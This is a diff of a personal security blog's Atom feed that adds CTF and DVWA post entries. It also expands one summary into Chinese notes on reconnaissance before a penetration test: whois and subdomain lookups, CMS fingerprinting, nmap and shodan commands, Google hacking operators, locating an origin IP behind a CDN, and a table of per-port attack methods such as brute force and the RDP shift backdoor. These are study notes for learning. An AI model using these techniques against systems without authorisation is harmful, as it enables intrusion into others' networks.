     <category term="sql" scheme="http://noone40404.github.io/tags/sql/"/>
     
     <category term="靶场" scheme="http://noone40404.github.io/tags/%E9%9D%B6%E5%9C%BA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>NISACTF 新生赛</title>
+    <link href="http://noone40404.github.io/2023/10/07/nisactf/"/>
+    <id>http://noone40404.github.io/2023/10/07/nisactf/</id>
+    <published>2023-10-07T05:10:00.000Z</published>
+    <updated>2023-10-09T11:35:42.508Z</updated>
+    
+    
+    <summary type="html">猪脑差点烧了</summary>
+    
+    
+    
+    <category term="ctf" scheme="http://noone40404.github.io/categories/ctf/"/>
+    
+    
+    <category term="ctf" scheme="http://noone40404.github.io/tags/ctf/"/>
     
   </entry>
   
@@ -242,15 +483,152 @@
     <updated>2023-09-21T07:40:01.091Z</updated>
     
     
-      
-      
     <summary type="html">&lt;ul&gt;
 &lt;li&gt;&lt;p&gt;域名信息&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;p&gt;&lt;code&gt;whois&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;  查询域名是否已经被注册，以及注册域名的详细信息的数据库&lt;/p&gt;
-&lt;p&gt;  不同域名后缀的信息需要到不同 &lt;code&gt;whois&lt;/code&gt; 数据库查询&lt;/p</summary>
-      
+&lt;p&gt;  不同域名后缀的信息需要到不同 &lt;code&gt;whois&lt;/code&gt; 数据库查询&lt;/p&gt;
+&lt;p&gt;通过工信部备案查询也可得到负责人信息，对于中小网站来说，网站负责人往往就是管理员&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;子域名收集&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;maltego CE&lt;/code&gt; 做子域名收集&lt;/li&gt;
+&lt;li&gt;搜索引擎 &lt;code&gt;site:xxx.com&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://tool.chinaz.com/subdomain&quot;&gt;第三方网站查询&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://censys.io&quot;&gt;证书透明度公开日志枚举&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;web&lt;/code&gt; 站点信息收集&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;CMS&lt;/code&gt; 指纹识别&lt;/p&gt;
+&lt;p&gt;  &lt;code&gt;CMS&lt;/code&gt; 内容管理系统，利用不同的结构命名规则和特定文件内容可以得到 &lt;code&gt;CMS&lt;/code&gt; 站点的具体软件和版本&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;识别工具&lt;/p&gt;
+&lt;p&gt;  &lt;a href=&quot;http://yunsee.com&quot;&gt;在线识别&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;a href=&quot;http://bugs.shuimugan.com&quot;&gt;对应网站查询指定漏洞&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;web&lt;/code&gt; 目录结构和敏感隐藏文件探测&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;    kali自带的 `dirbuster`
+
+- `wordpress` 测试
+
+    可以理解为一种独特的 `CMS` ，可以在kali里用 `whatweb [website]` 进行探测
+
+    当然，上面的在线识别网站也可以用.
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;端口信息收集&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;端口扫描&lt;/p&gt;
+  &lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;netstat -anbo windows查看已开放端口&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+  &lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;nmap -A -v -T4 -Pn [target IP]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;  &lt;code&gt;masscan&lt;/code&gt; 扫描&lt;/p&gt;
+&lt;p&gt;  &lt;a href=&quot;http://tool.chinaz.com/port&quot;&gt;在线网站扫描&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;端口攻击&lt;/p&gt;
+&lt;script type=&quot;math/tex; mode=display&quot;&gt;
+  \begin{array}{|c|c|c|}
+      \hline
+      port &amp; 端口说明 &amp; 攻击方法 \\
+      \hline
+      22 &amp; ssh 远程连接 &amp; 爆破，ssh隧道急内网代理转发，文件传输 \\
+      \hline
+      23 &amp; telnet远程连接 &amp; 爆破，嗅探，弱口令 \\
+      \hline
+      3389 &amp; rdp远程桌面 &amp; shift后门，爆破 \\
+      \hline
+      5900 &amp; vnc远程连接 &amp; 弱口令,rce \\
+      \hline
+      5632 &amp; PcAnywhere远程连接 &amp; 嗅探，代码执行 \\
+      \hline
+  \end{array}&lt;/script&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;敏感信息收集&lt;/p&gt;
+&lt;p&gt;  搜索目标暴露在互联网上的关联信息，如数据库信息，服务器配置，sql注入，甚至通过 &lt;code&gt;git&lt;/code&gt; 找到源代码，&lt;code&gt;redis&lt;/code&gt; 授权未访问，&lt;code&gt;robot.txt&lt;/code&gt; 等信息&lt;/p&gt;
+&lt;p&gt;  所以在技术渗透前应多加进行信息收集&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;google hack&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;  借助搜索引擎对特定网络主机漏洞（通常是服务器的脚本漏洞）进行搜索，&lt;/p&gt;
+&lt;script type=&quot;math/tex; mode=display&quot;&gt;
+  \begin{array}{|c|c|}
+      \hline
+      函数 &amp; 含义 \\
+      \hline
+      site &amp; 指定域名 \\
+      \hline
+      inurl &amp; 网站url中关键词\\
+      \hline
+      intext &amp; 内容中关键词 \\
+      \hline
+      filetype &amp; 文件类型 \\
+      \hline
+      intitle &amp; 标题中关键词 \\
+      \hline
+      link &amp; 指定与改网页做外链的站点 \\
+      \hline
+      info &amp; 搜索指定网站信息 \\
+      \hline
+  \end{array}&lt;/script&gt;&lt;p&gt;  &lt;a href=&quot;http://www.exploit-db.com/google-hacking-database&quot;&gt;googlem hack数据库&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;http&lt;/code&gt; 响应搜集 &lt;code&gt;server&lt;/code&gt; 信息&lt;/p&gt;
+&lt;p&gt;  通过 &lt;code&gt;http(s)&lt;/code&gt; 与站点沟通时，目标响应报文的 &lt;code&gt;server&lt;/code&gt; 头和 &lt;code&gt;X-power-by&lt;/code&gt; 头会暴露目标服务器和使用的编程语言信息&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;获取响应&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;浏览器审计，&lt;code&gt;burp&lt;/code&gt; 截获&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;借助 &lt;code&gt;requests&lt;/code&gt;库 使用&lt;code&gt;python&lt;/code&gt; 脚本&lt;/p&gt;
+  &lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;import requests&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r=requests.get(&amp;#x27;[target]&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(r.headers)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;真实 &lt;code&gt;IP&lt;/code&gt; 泄露&lt;/p&gt;
+&lt;p&gt;  &lt;code&gt;CDN&lt;/code&gt; 即内容分发网络，请求时直接从当地的高速缓冲服务器中获取，只有交互时才与网站服务器连接&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;判断存在&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;ping&lt;/code&gt; 命令&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://ping.chinaz.com&quot;&gt;在线 &lt;code&gt;ping&lt;/code&gt; 网站&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;获得 &lt;code&gt;IP&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;无 &lt;code&gt;CDN&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;  直接 &lt;code&gt;ping&lt;/code&gt; ，或者利用&lt;a href=&quot;http://www.ip138.com&quot;&gt;在线网站&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;有 &lt;code&gt;CDN&lt;/code&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;网站的 &lt;code&gt;php.info&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;找到内部邮箱源，收集内部邮箱服务器的 &lt;code&gt;IP&lt;/code&gt; 地址&lt;/li&gt;
+&lt;li&gt;尝试分站或者子站，&lt;code&gt;CDN&lt;/code&gt; 可能不包含&lt;/li&gt;
+&lt;li&gt;利用&lt;a href=&quot;http://asm.ca.com/en/ping.php&quot;&gt;国外网站&lt;/a&gt;，公司可能并未架设外国 &lt;code&gt;CDN&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://viewdns.info&quot;&gt;查询域名解析记录&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;验证 &lt;code&gt;IP&lt;/code&gt; 地址&lt;/p&gt;
+&lt;p&gt;  直接访问所得到的 &lt;code&gt;IP&lt;/code&gt; ，查看网页栏前是否有 &lt;code&gt;logo&lt;/code&gt; ，以及是否有报错&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;shodan&lt;/code&gt; 信息收集&lt;/p&gt;
+  &lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;shodan host [IP] 查询对应ip的信息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;shodan myip 获取自身外部ip&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;shodan honeyscore [IP] 检测蜜罐&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</summary>
     
     
     
@@ -399,25 +777,6 @@
     <category term="dvwa" scheme="http://noone40404.github.io/tags/dvwa/"/>
     
     <category term="文件上传" scheme="http://noone40404.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>DVWA-file inclusion</title>
-    <link href="http://noone40404.github.io/2023/07/31/DVWA-file%20inclusion/"/>
-    <id>http://noone40404.github.io/2023/07/31/DVWA-file%20inclusion/</id>
-    <published>2023-07-31T09:10:00.000Z</published>
-    <updated>2023-08-02T05:03:53.942Z</updated>
-    
-    
-    <summary type="html">dvwa.4</summary>
-    
-    
-    
-    <category term="web渗透" scheme="http://noone40404.github.io/categories/web%E6%B8%97%E9%80%8F/"/>
-    
-    
-    <category term="dvwa" scheme="http://noone40404.github.io/tags/dvwa/"/>
     
   </entry>
   
